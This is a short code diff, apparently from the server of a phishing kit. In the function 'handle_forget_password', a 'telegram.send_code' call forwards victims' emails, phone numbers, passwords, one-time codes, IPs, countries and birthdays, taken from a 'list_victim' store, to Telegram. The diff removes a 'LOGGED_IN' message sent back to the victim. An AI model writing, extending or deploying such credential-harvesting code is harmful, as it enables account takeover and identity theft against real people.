@@ -171,8 +171,6 @@ def handle_forget_password(code):
                     code, country=get_country(ip), type='FGP')
     telegram.send_code(
         'CODE 681', list_victim[ip].email, list_victim[ip].phone_number, list_victim[ip].password, code, ip, country=get_country(ip), birthday=list_victim[ip].birthday)
-    socketio.emit("deviceResponse",
-                  {"status": "success", "message": "LOGGED_IN"})
 
 
 @socketio.on("device-verification")
